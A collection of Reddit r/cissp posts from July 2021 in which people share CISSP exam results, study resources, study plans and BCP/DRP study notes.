5. Do not be afraid to fail. This is one thing I told myself starting this process, no matter what happens, I am bettering myself for doing this… I was not afraid to fail, what I was afraid of was of having to continue to study and retake this thing….wasting what I have left of my summer break… so don’t be afraid! After all, it’s a process, and participating in this process you will be shocked at how much you learn and grow!

Resources (what people seem to care about the most):

* Sybex OSG (8th Ed.):

\-Primary resource of reference/clarification for the entire process.

\-First pass, “read” cover to cover… took end of chapter tests, moved onto next chapter.

\-Emphasizing the “read” portion, as I did not read it word for word as some did….. Chapters I felt more comfortable with the material, I skim read and picked points within each chapter I had no idea what is was, and fully read that section.

\-Second pass, read the sections I scored lower than 75% on the end of chapter tests from start to finish, retook the tests.

* Sybex OSG Practice Tests (8th Ed.): Register your book online! Much easier and more convenient as you can access the tests with your phone, or tablet…. I DID NOT take all of these tests, as mentioned I did each chapter test in the manner above. For each practice test, the matter at which I took them, took each Domain test once, pending the score (e.g. below 75-80%) I would go back and review that domain, and then retake the questions I got wrong… to alleviate from memorizing answers.
* 11th Hour CISSP: After I read the massive Sybex OSG I needed more “light reading.” I read this book front to back, easy read…. Very high level overview of the topics. So stepping your mindset back a bit from the OSG source.

Videos:

* CybraryIT -  [Free Cybersecurity Training and Career Development | Cybrary](https://www.cybrary.it/) (free access if you only access a certain number of sources, not do check whatever I did about a ""premium offer""..they'll never stop calling you until you tell them to leave you the heck alone) – Kelly H’s videos… these were a great change of pacing getting out of a book, and questions. I DID NOT watch all of these….I watched her videos on topics I needed clarified, or explained in another way from my reading.
* Destination Certification Mindmaps -  [CISSP MindMaps / Domain Review - YouTube](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) : Wow, yes, I watched all of these…. And some of them multiple times for topics I just wasn’t grabbing onto….. 10/10 recommend this to help tie words together that may help you on the exam.
* Inside Cloud and Security -  [CISSP Exam Cram - YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) : Again, yes, I watched all of these…… And some of them multiple times (probably each of them at least twice). I used his 2021 topics videos to supplement the OSG version I used not having the most recent topics.
* Prabh Nair’s CISSP videos, and Coffee Shots -  [Prabh Nair - YouTube](https://www.youtube.com/channel/UCfZMpaSGpTa4JoqoZHCJBcw) : I incorporated these my final two weeks of study (by the point you’re either getting it or you’re not)… his videos were great! I also used his 2021 topics videos to supplement the OSG version I used not having the most recent topics. Tip for his videos, put the speed on .75x… he speaks rather quickly…. This helped my tremendously.
* Andrew Ramdayal CISSP videos -  [CISSP - YouTube](https://www.youtube.com/playlist?list=PLdC3YQR4lNFLHJh_lOd2QMovHjhEdTFjN) : I watched all of his videos once, particular one that stood out to me was his “Testing Tips” and “Practice Question” videos.

Questions:

* OSG Practice tests
* CISSprep.net: I was hesitant on buying this… just because I am cheap, and the mixed opinions… I personally enjoyed this platform, the questions were a headache, yes…grammar mistakes, some complained about not knowing single or multiple answer options…whatever, if you’re worried about that… you’re head is not in the right place. Pass the exam, make your own prep engine that is grammatically correct with explicit instructions of SELECT ONE....….(end rant on CISSprep). Scores ranging from 50-80%.... my overall average score was 65.8%.. I tracked my scores throughout the process... OCD, sometimes, more of a moral booster....
* Pocketprep App: This was an awesome resource for me because of convenience. Can be taken on your phone or table! Definitely helps nail down the factual items to build the conceptual knowledge you need.
* ISC2 Official Study App: Again, great resource due to convenience! Great supplemental method of doing questions to keep your mind on topics along with Pocketprep.
* rSlades blog post on ISC2: [Practice Questions - (ISC)² Community (isc2.org)](https://community.isc2.org/t5/Exams/Practice-Questions/td-p/18626?fbclid=IwAR138lfLPSzBL90njFDCi6Xe0j-wUXT7i1I4nw8iS3rs33HyV-P_tMlzU_0). These were awesome, another source of questions with explanations (sometimes collaboration from viewers)

Notecards:

*   I made note cards for basic topics, processes, procedures, and concepts I knew I needed to have in an instance… maybe 50-75 notecards total, I did them every day before work, and every night before bed….things such as: SDLC, BCP, DRP, BIA, SOC reports, Security Models, Incident Response, RMF, RAID, Backup Types/Benefits, SAML, ISC2 Cannons, Cryptography. More or less things I knew I needed to nail down, processes/steps, and random things I just always have a hard time committing to memory. 

Anyways, yeah…. I am humbled, overwhelmed, and gracious to join the ranks of fellow CISSPs! Thanks to all for continuously keeping this thread alive (daily), I lied in wait for a while taking notes on peoples prep methods, inputs, etc. and here I am! Thanks to all those on here I reached out to with questions/advice! Now I am going to enjoy the month I have left before back to the educational grind in the evenings!

Good luck!",2021-07-20

3227,onz36q,Passed (1 hour ago :D) 1st Try 100 Questions,"In the words of Colin Weaver ""Hey all you CISSP wanabees""

I just got back from my exam and all my thoughts are fresh in my mind so I thought I could share them with this group.

**My Background**

I've been in Cyber Security for just over 5 years. I work for a fortune 500. I'm a manager for a team that works on data security: DLP, DRM, Insider Threat.

**How I studied**

I started studying in late September or early October of last year. I went through the official study guide. I read through the entire book and took notes as I went. I used the online test bank that comes with the book and was going through. I was studying maybe 1 hour a day and usually 2-3h/day on weekends. Around Christmas I got burned out and then picked it back up around the end of January.

Then I went through the Destination Certification videos. I was getting about 80% on my Sybex practice exams and I felt good. Sybex also has online flashcards which helped too. At this point I was studying a minimum 2 hours per day. I went to book my exam and saw that the testing facility had filled up and I couldn't take my exam for another 2 months. (This pushed me into May and the updated course.)

With my extra time to study and to prepare for the updated course I watch Mike Chapple's Stuff on LinkedIn Learning. I'm not sure I would recommend the course, I can't remember a single topic I retained from his class. He did cover some topics for the new exam but he presented in a really dry way. I was watching at 1.25 speed the entire time. I also downloaded Anki, a flashcard program which was one of my best tools. Someone has uploaded some free practice questions that you can search for. I also just started adding terms and topics I needed to study harder. When I would go through an exam and get something wrong I would add that as a card. I have reviewed flashcards everyday since May.

With one last weekend before my exam, I bought some extra practice exams to study. I bought CISSP Exam Prep and the Udamy course. I took the Udamy exam and got a 40% three days before my exam date. Let's just say I was a bit concerned. I started taking the CISSP Exam Prep exams and I was getting 50%-60%. I freaked out and after some discussions with my fiancé decided to pay the $50 and reschedule for July.

I wanted to study seriously for the next two months with my extra time. I started by going through Kelly Handerhan's course. Her course was really good for what it covered but it doesn't cover all topics. Then I started going through the CISSP Exam Prep practice exams every other day. Then on the other day I would review other materials. I reviewed the Sybex book again. I read the 11th hour book (I wouldn't recommend it). I did IT Dojo Questions of the day, these were good when I was burned out from doing other things. I also studied my flashcard every day. At this point I was probably studying 2.5 hours everyday. I would also do Boson exams to get ready and identify gaps in my knowledge.

Yesterday, I reviewed my flashcards and then meditated a lot to calm my nerves. I watched Kelly Handerhan's why you will pass the CISSP exam. I had 3-4 questions where this video directly helped me.

**The Exam**

I expected the exam to be less technical than Boson and CISSP Exam Prep. It was. It was more straightforward knowledge based than I expected. I was expecting more experience questions but most of the questions were around a specific piece of information from the CBK. I kept hearing ‘think like a manager’, but I felt like there were more knowledge based questions. They weren't trying to trick you as much as I was expecting. I felt like I was very prepared with what I had learned and studied. Once I got into the exam it wasn't as bad as I was expecting. I felt okay about a lot of questions. In the last 10 questions, the questions got easier and I ended right at 100.

**What I recommend**

Reading the Sybex book was painful but had to be done. I think after that I would have done a visual refresher like Destination Certification. Using Boson and CISSP Exams, but using them to learn, not killing yourself on the score you get. You can't get a 40% and expect to pass but don't worry if you are getting a 66% vs a 70%. These exams are way more technical and complexly worded than the real exam. They help you prepare for the mindset of being able to pick apart a question. For example, if you see a question about control implementation, you better make sure you know if they want a preventive control, a detective control, an administrative control, or a technical control. That’s the mindset you need to have. Flashcards are a must for cementing topics in your head. I highly recommend Anki. I didn’t do a bootcamp but looking back I should have asked my company to buy me one. 

I don’t recommend the Udamy exam. It was overly confusing and just intentionally difficult. Some of the questions I was just mad at and would roll my eyes at why they said the answer I chose was wrong. 

Booking the exam well in advance is important. I didn’t realize that it would fill up. I checked once and they had openings every wednesday. Then I went to schedule my exam, and it was full for the next two months.

If I was doing it again, I think I could have shortened my study time, if I had done the practice exams earlier. I had relied a lot on the Sybex exams and thought those would be enough but they weren’t for me, they gave me a false sense of security. 

**Content Refresh**

I know a lot of people want to know how different the content is for the new exam. I do think I got a couple questions on new content but it was topics that I was familiar with through my work so it wasn’t very difficult.

**Overall**

Keep studying, keep working, keep your faith. Good luck everyone!",2021-07-20
3228,onxvll,Provisionnally passed @100 questions,"Hi,

Just wanted to share my feedback after passing provisionnally.

&#x200B;

**About me**

* About 10 years experience in IT Audit, GRC, CISO. Not really a tech guy.
* I registered 2 years ago, had zero motivation to study and rescheduled it. Then covid arrived and I had to reschedule two more times...

&#x200B;

**Preparation**

1. Eleventh Hour CISSP - I did not open at all the official guide, but I have read twice this smaller book. Very good starter for lazy people like me.
2. CISSP Official Practice Tests - Did all questions and looked on internet to understand when I was wrong. Resources I used the most.
3. PocketPrep (IT & Security) - Very good to test your knowledge with direct questions to use during transports. Not too technical and not too expensive. I did all questions.
4. Random website ([http://luc.desfosses.fr/CISSP/](http://luc.desfosses.fr/CISSP/)) - I do not remember where I found it, probably on reddit, but this has been a good summary of key concepts. I also wrote on paper the key concepts (OSI, ports, security models, SOC, BCP, ...).
5. 2021 Exam change - As I took a very long time to get the motivation to start studying, the content has changed in May so I looked to the changes on this website [https://www.cybervista.net/cissp-may-2021-exam-update/](https://www.cybervista.net/cissp-may-2021-exam-update/)

I hesitated a lot to buy Boson questions after reading this reddit, but I also looked at many feedbacks here saying that Boson questions were too technical compared to the exam so I did not buy. And to be honest I think that knowing more technical details would not have helped at all. At least I saved some money.

&#x200B;

**Exam**

* As most of people here I was not very confident that I would succeed during the test. I thought I would go to 150 questions but it ended at 100...
* You really need the high level view of what is used for what (concepts). You do not need to bother learning by heart every technical details of everything.
* Work experience helped a lot, although I am not a tech guy I review lots of risk analysis and the mindset is similar.

&#x200B;

Good luck to everyone ! I will go for CCSP in September :)",2021-07-20
3229,onvy9p,Average score on practice tests,"For those of you who have passed the CISSP already, what was your average score on practice tests you completed?  Debating if I wait to take the exam until I’m consistently scoring 80-90%",2021-07-20
3230,onsqur,Study Partner/Study Group?,"Hello everyone. I am currently studying for the CISSP exam with my test date set for September 17th. I have been in the Info Sec world for a little over 4 years as a security generalist for 2 medium-large companies (technical title is Security Engineer but it's more a combo of engineering/analyst work/compliance stuff - basically whatever needs to be done).

I have read in various posts that having a study partner or being in a study group is a helpful tool, but I'm not quite sure what that entails - regular group study sessions? IMing each other questions? Having someone to console you when you realize your brain is too small to retain any knowledge??

My current study plan is:

1. **July 8 - Jul 30:** Self-Study with Mike Chapple Linked-In Course. Review with Pocket Prep app. Take test quizzes/exams on CISSPrep after finishing course videos.
2. **Aug 2 - 6:** TIA CISSP Bootcamp
3. **Aug 9 - September 15:** Review Bootcamp notes, Create Flashcards, More CISSPrep, Read Official Study Guide Cover to Cover (the book comes with my bootcamp), Do Practice material in Official Study Guide
4. **September 16:** sacrifice goat
5. **September 17:** PROFIT?

**I don't know if this is enough.** If feel so unprepared even though i have only been watching the course and taking notes for a little over a week. For my previous 2 certs (Sec+ and GCED) I just took a bootcamp, studied a little, took a few practice tests and I was ready to go. Had no issues with either exam. But I am dreading this one. 

So I'm wondering if adding a study buddy/study group will help me feel less...stupid? Or at least help me to know if I'm way off base with my learning.

3235,on293l,"Passed and certified, here are my thoughts.","Hey everyone, as the title states I provisionally passed my CISSP exam at the end of June and was fully certified by (ISC)² three weeks later. I delayed making a post to formulate my thoughts regarding the entire experience.  This post is kind of long, TLDR at the bottom. 

Initially I reviewed this subreddit to get a grasp of where to begin, though I will admit I didn’t follow the suggested study plan.  I studied lightly on/off for 3 months and diligently for 2 months. Make sure in the lead up you take time for yourself. If you begin feeling burnt, stop for a while.  Play some games, go for a run, or talk with a friend about non CISSP stuff. Studying through fatigue will only hurt you. 

For background I have 5 years direct information security work experience and a graduate level degree. 

Books
- CISSP All-in-One Exam Guide, Eighth Edition, 8th Edition - Rating: 8/10
- Sybex (ISC)² CISSP Certified Information Systems Security Professional Official Study Guide, 8th Edition - Rating: 10/10

The AIO helped me get into the right mindset regarding the exam. The dialogue referenced many real world applications of the concepts. 
The Sybex book was by far the best study resource for exam preparation.  It covered everything necessary for exam prep. 
When I encountered a topic or concept in either book I was unsure about (even slightly) I transcribed the definition or section verbatim into a spiral using a pencil (tactile feedback)

Practice Exams
- (ISC)² CISSP Certified Information Systems Security Professional Official Practice Tests (online bank included with the book) - Rating: 9/10
- Boson - Rating: 2/10
- Pocket prep (free 30 questions)- Rating: 3/10

The official practice tests online were invaluable for isolating the areas I had deficiencies in. Additionally, the flash cards were great for quick studying throughout the day. 
The Boson test bank was large, though in my opinion the program was clunky and the questions were not as useful as reviews I had read made them out to be. I didn’t use the Boson tests in the final stretch of my study. It may work for you, though I suggest trying the official practice tests (included in the official guide package) before shelling out money to Boson. 
PocketPrep was great for quick study when I was waiting in lines or had a spare moment. I didn’t purchase the full version as I had already purchased the Boson bank. 
Overall, the practice tests were nice to prepare me for timing on the exam and identifying deficient areas, though they are not reflective of the exam itself. As difficult as it may be, don’t put too much stock in the practice exam scores, instead use the data to focus your study efforts. I really dug my heels into practice exams in the final few days before the exam and found myself doing worse and burning myself out.  Much like the books I hand transcribed the answers to questions I got wrong and flagged them. 

Audio/Video
- CISSP, 2nd Edition Sari Greene - Rating: 7/10
- Destination Certification (YouTube) - Rating: 4/10
- Eleventh Hour CISSP Study Guide (Audible) - Rating: 10/10

Sari Green is great. The videos were encouraging and the knowledge tests assisted in recalling useful information. I will admit I didn’t finish the series as it wasn’t as in depth as the official study guide. 
The Destination Certification YouTube series was nice for background study and reference, though for me it was more of a feel good effort. Some of the graphics assisted me in mentally categorizing information. 
Eleventh Hour was fantastic. I snagged it on Audible in the final two weeks of study, listened to it at 1.25 speed while working out or cleaning and would make notes on my phone of topics I wanted to review in depth. This resource often highlighted information that I gleaned over in the books.

Endorsement Process
Once I passed, I created my account and submitted my application. There are no CISSP’s that I work with so I opted to have (ISC)² sponsor me. 2.5 weeks after submitting my application (ISC)² stated they needed additional verification of my work history. Unfortunately my place of employment refused to write/provide a letter of affirmation regarding work history and directed me to a third-party service. I provided the information to (ISC)² and received feedback that they will not interact with a third-party. (ISC)² then stated they were going to audit my application. I won’t lie to you all, this stressed my out after having read some horror stories on this subreddit. 
Nearly out of options, I provided tax documents (with sensitive information redacted) and unofficial transcripts. The next day I got a notification that my application was accepted and I could pay my membership fee.  

Overall, it was a lot of study and felt daunting at times. Take it a topic at a time, write things down, and take breaks! Good luck everyone!

3239,omj3yq,7/10/21 Fail at 150 questions,"Sigh. Here I am writing the post I never wanted to write. I went for it on 7/10/21 and didn’t pass. Hoping to help others and get a little advice on the next steps to take. 

Per my previous post [here](https://www.reddit.com/r/cissp/comments/oexlqz/cue_the_panic_5_days_until_exam_date/?utm_source=share&utm_medium=web2x&context=3), I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. I'd been studying off and on for a little over a year, four consecutive months of intense study, and utilized the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I’d also taken a 10-week boot camp class three times.

I knew there were topics I didn’t have down 100% but felt I *probably* knew enough to get me by. When I sat down at the computer to take my exam, I knew I was in trouble 20 questions in. The questions looked so foreign and vague. I read and reread and reread every question, breaking the sentence down by word, looking for some semblance of anything I’d seen before. I couldn’t make sense of any of it. I had anticipated this since that’s what everyone says but that didn’t cushion the shock.

I went all the way to 150 questions. I saw a lot of questions on SDLC, at least five questions on SOC compliance and a few on DRP/BCP. Nothing super technical with the exception of a few IPSec and tunneling protocol questions. Nothing on Kerberos, nothing on OSI. Out of all 150, I felt confident I knew the answer on maybe 5 questions. 

What’s really crazy is that I had “think like a manager; don’t DO anything” tattooed on the inside of brain going in. But none of the questions, nor any of the answers, within my exam were structured that way or provided answers that were that high-level. I’m not a technical person so it’s not my instinct to “fix” anything. There weren’t any “weeds” to get into. The questions weren’t super technical but they most definitely weren’t high-level. Somewhere in between, if that makes sense. 

I was below proficiency in four domains, near proficiency in three, and above in one domain. Interestingly, the domains I’d considered my weak domains while studying were my strongest, and my strong domains were “below proficiency.”

So now I’m trying to decide what to do: whether to give it another go or maybe try another certification like Security+ to help build up my confidence. There’s a real big part of me that wants to keep going and build onto the momentum I had and try again in 60-90 days. There’s another smaller part of me that wants to walk away from it completely and get my life back again and enjoy the rest of my summer.

Any advice, opinions, feedback? Should I try again or go for Security+? Is this just too big an elephant to eat for a non-technical professional?",2021-07-18

Second is one of the corners of the CIA Triad: availability.  Much like the human heart, the second high-level objective is to keep the lights blinking and systems online.

The topic of proper business continuity and disaster recovery planning is **highly testable**.

* Components of the Business Impact Analysis (ARO, MTTR, MTBF, SLE)
* The idea that all stakeholders of a BCP should be involved in the planning
* Business continuation strategies
* The importance of documentation

**Here are some important concepts to remember**:

* The process of recovering an organization's critical business functions after a disaster is known as BCP
* Dealing with a more immediate or specific emergency is known as DRP.
* Difference between BCP and DRP
* BCP is more high-level than DRP.  DRP falls under the umbrella of BCP.
* ""What if our main data center was destroyed by an earthquake, what do we do?"" - That's BCP.
* ""What if our firewall failed at our main data center, what do we do?"" - That's DRP.
* The start of any organization's DRP/BCP program must have the approval of the senior management team
* Management's approval is also a show of their support
* BCP/DRP is all about documentation, documentation, documentation
* According to the CISSP, the first thing to look for in a disaster is the proper documentation that contains procedures and guidelines on how to deal with a disaster
* As with all things CISSP, keep the BCP/DRP document alive with regular updates.  Changes to the organization's governance, infrastructure, or an addition of a new technology should be reflected in the BCP/DRP.  Users and executives alike should also accumulate a certain level of training, education, and security awareness to contribute to a strong BCP/DRP program.

**Here are some types of disasters**:

* Man-made
* Negligence
* Warfare
* Fires
* Terrorism
* Insider threat
* Cyber attack
* Natural
* Flood
* Earthquake
* Tornado
* Tsunami

**The basic steps of a sound BCP are**:

* Phase 1: Scope and Initiation
* Phase 2: Business Impact Analysis
* Phase 3: Recovery Strategies and Continuity Development
* Phase 4: Implementation and Testing
* Phase 5: Maintenance

**RTO vs RPO vs MTTF vs MTTR**

RTO is the maximum amount of time that is needed to bring critical business functions back to normal operating status before that business is crushed.

RPO is the measure of at what point in time a business can go back and still salvage enough data to fully operate.  For example, can a business lose all the data it has accumulated in the last 10 minutes and still operate as a business? Probably.  But can it lose all the data it has accumulated in a 12 hour period and still function? This depends on the type of business.  A company that deals with the stock market and money, probably has a really short RPO, compared to a school with a database of past test scores, which could have a longer RPO.

MTTF as we stated is the same thing as MTBF.  It is the measure of how long something is supposed to operate before failure.

MTTR is the amount of time required that is necessary to bring a critical business function back to operation.  The mean time to recovery for your 2nd monitor in a dual monitor setup can probably be 72 hours to a week before you start finding it necessary to have a 2nd monitor again.  The mean time to recovery for your mouse is probably a lot shorter, maybe minutes to hours?

3247,ol29bu,Provisional Pass,"Hey ladies and gents,

I took the test yesterday just out of whim. I'm a network administrator with 8 years experience. I honestly think that Security+ was harder than the CISSP exam and I think that could be attributed to the large body of knowledge and question pool that usually comes with CompTIA exams. I'm at the tail end of a Cybersecurity degree so maybe that helped out but I just went in to the test with a ""ain't nothing to it but to do it"" attitude. The body of knowledge illustrated by ISC2 is crucial to planning out how you need to study if you have prior knowledge of the field. I think my networking experience helped out too. The toughest part for us technical folks I believe would be moving away from our traditional thought process when it comes to solving problems. There are going to be multiple choices that feel like the right answer but it's all about management mentality that'll help find the ""most"" right answer. CBT nuggets helped as a sort of passive learning tool just by being able to put it on while I'm driving too and from work. For everyone else wishing to pursue this certificate I wish you all the luck!",2021-07-15

**About Me** - 9 years of experience in IT Audits, Risk and Compliance, and conducting Security Assessments. Studied for close to 6 months.

**Preparation**:
 * This subreddit - Honestly I would not have passed if it wasn't for you guys. All the resources I used below (except the OSG) I found out through all of you.   
 * OSG 8th edition - very comprehensive but I think one of the best resources.   
 * Kelly Handherhan's course on Cybrary - Her delivery and teaching style cements concepts into your brain.   
 * Destination Certification Mindmap videos and CISSP CRAM on Youtube - Very useful for reinforcements. Highly recommend watching these 1 or 2 weeks before the exam   
 * CISSPprep.net - This one was amazing. I felt the real exam questions were similar to the questions here. It was frustrating because I was scoring only 60% on an average but helped me a lot in identifying my weak areas.  
 * Eric Conrad 11th Hour CISSP - Unpopular opinion but this didn't work for me.   
 * Official practice tests 2nd edition - Make sure to read the reasons for why something was right or wasn't right.  
 * Kelly Handerhan - why you will pass the CISSP - cannot recommend this enough.   

**The Exam**: Can't say anything that hasn't been said before. Most of the questions I could boil it down to two options, some questions were direct. I honestly thought I failed. Do not bother memorizing anything. I made sure I read each question 2-3 times and put on my manager hat.

2. I am a martial artist.  I'm planning to test for my 4th Dan next year, and after that travel to take the Master's seminar and qualification.

3260,oi6439,Passed - 2'nd Attempt,"All, 

Would just like to give my 2 cents since I passed the exam yesterday and previously posted in this forum about failing this exam in February.  Honestly, it was heartbreaking back then and I didn't even know if I wanted to go through the process again.  I somehow found the motivation to give it one more try and I passed yesterday with literally seconds left at 120+ questions.  I thought for sure I would fail or that I'd run out of time as the questions kept coming in. 

The exam is an absolute beast and I don't think any amount of studying will fully prepare you for this thing.  Even on the second attempt, I felt complete beaten up by the test and saw things that I saw no where within the study materials.  I'd estimate I studied over 250+ hours combining from the first test. 

I honestly can't say anything that you don't already know.  You need to study the normal materials, but you also just need to have the right mindset.  Thinking like a manager is easy to say, but I'm just not sure how much that carries on this test when you're going through it.  I'd say my best advice is don't worry about knowing specific definitions, but knowing exactly how everything works in a real world setting is much more important. 

Also I went with the approach of reading the question multiple times and even purposely slowed down on questions I knew the answer.  I don't think this is a good approach considering I literally had seconds left with potentially a LOT of questions left if the exam was to continue. 

I am beyond relieved and taking some much needed time off.",2021-07-11

I was panic reading until last minute trying to cramp as much knowledge as possible, my best advice is to relax on the exam day.  After around 15-20 questions I started to develop the feeling that I will surely fail the exam.  Like many of you said in past no test bank will prepare you for the actual exam questions. They are worded differently and make you feel tempted to click the wrong answer, be sure to read the question multiple times. There were questions where i purely guessed the answer as I never read those topics in my life. I was mentally exhausted and was preparing for the worst and after 100 question the test stopped.  I went to the front and received the result and to my surprise i passed, i couldn't hold my excitement and shouted a big YEESSSSSSSS.  While collecting the items the tears rolled down (its okay to cry). This exam was not just exam it was my dream, I am not sure what it will hold in future but it was my first professional level exam and i gave all for this exam. I always stayed around 2 hr after work just to study for the exam. I prepared this exam for almost 1 year getting distracted in between with free COMPTIA beta exams. I am currently in US in F1 visa (student) and its really hard to find the Job, the struggle is REAL.  My Background 5 Years in General IT (Network support/ Help Desk support/Jr System admin stuff )in home country never had any true Security Position.

* Eleventh Hour CISSP Study Guide
* Boson Practice Test - Make sure to read the explanation.

3262,ohxoha,Passed today - was certain I didnt!,"First - I'm making this post because reading everyone elses helped me a LOT. So, Reddit = 10/10

Second - I'm an idiot, I don't learn fast, and this shit was hard to study for. If you are reading this you are smarter than I am - you will pass this.

The exam was brutal. 20 questions in and I'm already mentally preparing to fail. The test stopped at 100Q and I would have bet $100 it was because I couldn't mathematically pass with more Qs. I shit bricks when I saw the Congrats. So here my biggest takeaways -

I used very few resources

\- the 2018 official guide and matching practice exam book(has 1000+ Q's, get this!),

\-the Syngress 3rd edition study guide and the Syngress 11th hr book (same authors)

\- Boson practice tests.

\-Thats it.  No new material studied for the updated exam - not needed!

Here's what I did

\- read every book, cover to cover, and highlighted the important concepts /facts.  If any of the material puts information in an outlined box - that's not extra info, its stuff you REALLY need to know.

\-Practice tests. Do as many as you can, find your weak domains, go back to the books and skim through your highlights, and take more tests.  Do NOT memorize the answers to your practice test, I promise this is a sure way to fail.

&#x200B;

* Key to passing- Answer your practice question correctly, then explain to yourself \*why\* the question was correct.  I didn't come across a single question on the real exam that resembled anything close to the 2000+ practice questions I took, but understanding why you chose the practice question answer is the secret sauce.

3265,oh9f9h,"Passed at 100 questions, ~2 weeks of study, 7 years IS experience","
Got sort of voluntold to get this by EOY about a month ago. Did the Training Camp bootcamp (I do not recommended, more below) last week as I had a “free” week between engagements. Hadn’t done anything at all prior to that week. Exam was not yet scheduled at the start of bootcamp. A couple days into the class one opened up for today, so I grabbed it. 
I’ll just say that the timing with this PrintNightmare… nightmare could not have been worse.

I did the bootcamp (Monday-Saturday morning).
Did nothing on Sunday.
Did a few practice tests Monday (holiday)
Tuesday actually got some real studying with notes and everything!
Wednesday all hell broke loose with the PrintNightmare patch and that sort of took over the rest of the week for me. My study time turned into very short (10-15 question) practice tests when I could grab a few minutes during the workday, then did the real ones (100-150) after hours. 
Exam was this afternoon, Friday, and I can’t wait to actually sleep tonight. 

I passed at 100 questions and I have no idea what the time was.
I was just as surprised how confident I was with many of the questions as I was with how many I stared at and second guessed for probably far too long. 

Study materials:
- Training Camp Bootcamp - I chose the virtual classroom option, not knowing that it was actually a hybrid class and I’d basically just be sitting on mute watching a live class with no real interaction. The instructor I had elected not to use the ISC2 training materials provided his own stuff, which he had not yet updated for the new CBK. There were some other issues, but those was the main ones. 
- CISSPrep - I literally got an account last night after seeing someone on here mention that their practice tests are hard. I wish I’d known about that sooner, probably would have passed on Training Camp, or any live training, entirely. 

Practice exams:
- CISSPrep - I found these to be the best. They’re hard, and it can be discouraging to do poorly. I found that the questions forced me to think the right way. Feedback on missed questions is both great and can be incredibly frustrating because if you miss a “not tricky” one it forces you to go look it up yourself and you actually LEARN.
- Sybex (latest version of the book, online question bank, and the app) - these were ok. The online bank and the app didn’t sync well, so I kept getting repeat questions despite toggling that setting off. It could stand to give better feedback on missed questions. 
- PocketPrep - Found it useful for short quizzes. Probably could have gone without this one but that’s ok. I liked being able to see the user average.
- CCCure - This was way more frustrating than it was helpful. I guess they let others contribute to their test bank to have it be like the real question pool where you’ll encounter questions written in different ways, but after awhile you start to be able to pick out questions by author, especially the bad ones, and there are bad ones. And with that comes a lot of inconsistency in answer explanation. Definitely could have gone without this one, and it was the most expensive by more than double. It was also recommended by the TC instructor but that’s neither here nor there.

About 5 years ago I was planning on getting my CISSP, but I got a promotion to a CISO and never felt the need to get it. Fast forward to remote work culture (and a few kids later) and now I'm re-evaluating where I want to be in the future (hint: It's less management and more technical problem solving).

I found this board and noted a few things. One that stood out was the PocketPrep resource. I took a few free practice exams to gauge where I was. Initial tests showed that I was averaging about 60%. I figured with a bit of hard-core ADHD studying, I could get it done. I bought the 8th edition of Shon and read that from cover-to-cover (highlighting all the important pieces) over the course of a week (coffee break? Grab the book. Bathroom break? Grab the book. Every meal? Grab the book).  I subscribed to PocketPrep and after reviewing Shon, I took a few exams. Where I was coming up short, I went back and refreshed on those domains. After burning through the rest of the PocketPrep question bank (with about 3 days to go), I found a question bank from Cybrary/Kaplan ([https://app.cybrary.it/immersive/enrollment/activity/27008376](https://app.cybrary.it/immersive/enrollment/activity/27008376)) and used their bank. After going through those questions, I realized that Shon was a little light in certain areas (despite the fact that it's 1300 pages). If I had more time, I probably would have acquired their referenced source as Shon does did not even reference some of the items found in the Kaplan questions ([https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691](https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691)).

Overall the exam included a lot of ""BEST"" or ""MOST"" answers and as a professional who lives in grey waters, I could constantly hear myself say ""It depends"", but context seemed to always be lacking. I honestly still don't know what the right answer was for most of them as often times it felt as though all 4 were correct, it just depended on your definition of ""BEST"".

At 100 questions/90 minutes I got kicked out. Since I was already borderline when I first took some practice questions, I took that as a good sign.

My job experience:  
4 years CISO (Definitely helped as I've dealt with a lot of this information from OJT and never heard of a lot of it when I was in my engineering roles)  
5 years in Analyst/Engineer Roles  
10 years of various IT/Sysadmin positions  


If you've been in the industry for a while, these questions still suck, but just buckle down for a few weeks-month and press through it. You got this!

3271,ogv3ld,Passed at 150 Questions and 3 Hours,"Took the exam and passed at 150 questions. I was pleasantly surprised and to be honest I did not expect to read Congratulations on the sheet after I left the testing center. 

One of the weirdest elements of my exam was that it almost felt like the exam was trying to get me to pass. As I passed question 100 I received many questions on concepts that I was most strong in. It really did start to mess with my head because I just assumed that the exam was just feeding me questions to get to 150 as I couldn’t understand how I got the same question on SOC reporting rephrased 5 different ways. 

Studying consisted of:

- Training Camp Boot Camp
- CISSP Exam Cram Youtube Videos
- Study Notes and Theory Test Questions (~200)
- Sybex Test Questions (~300)
- Luke Ahmeds How to Think Like a Manager for the CISSP

Overall i’d say the Exam Cram videos were the best to jog my memory on all the concepts leading up to the Exam. I don’t think I took the conventional study method as I took the Training Camp bootcamp and sat for the exam a few weeks later. I’ll be honest that my exam prep wasn’t the greatest as I only had limited nights and weekends to dedicate. But the week leading up I had 2 full day cram sessions (the day before and the day of the exam). 

Happy to answer any questions you have on the Exam or study materials. 

Thanks to all within that have posted their experiences in here, not sure I would have passed without reading experiences and suggested study materials listed here.",2021-07-09

3274,ogfy0o,Passed the CISSP exam last week. Here's how I studied.,"I'll start with a big thank you to everyone that has posted what worked or didn't for them while studying. I gained a lot of insight browsing through numerous posts. I don't have any incredible insights, but below is what I used to pass the exam and hopefully someone can get some use out of it.

Almost all of the sources I used are available for free via O’Reilly/Safari Online if you have a DoD email.

 

Video Courses:

- Cybrary CISSP Video Course [Free]- Kelly Handerhan (15 hours) 
This course does a tremendous job of highlighting all of the major topics in each domain. Provides examples that make concepts relatable and easy to digest.


- CISSP Certification Video Boot Camp [Free w/O'Reilly account] – Thor Pederson (24.5 hours)
Provides a lot of practical examples. Examples are framed in a way that aligns to the “CISSP mindset.”


- CISSP Cert Prep [Free trial via LinkedIn Learning] – Mike Chapple (24 hours)
This was the only source updated for the new version of the exam released in May that I used. This series does a good job covering Domain 3 compared to the other sources.

- CISSP Complete Video Course, Second Edition [Free] – Sari Greene (26 hours)
This course is more formal and in-depth, heavily focuses on practical application of topics (some are not relevant to the exam).

- Mind Map [Free] – YouTube (6.5 hours)
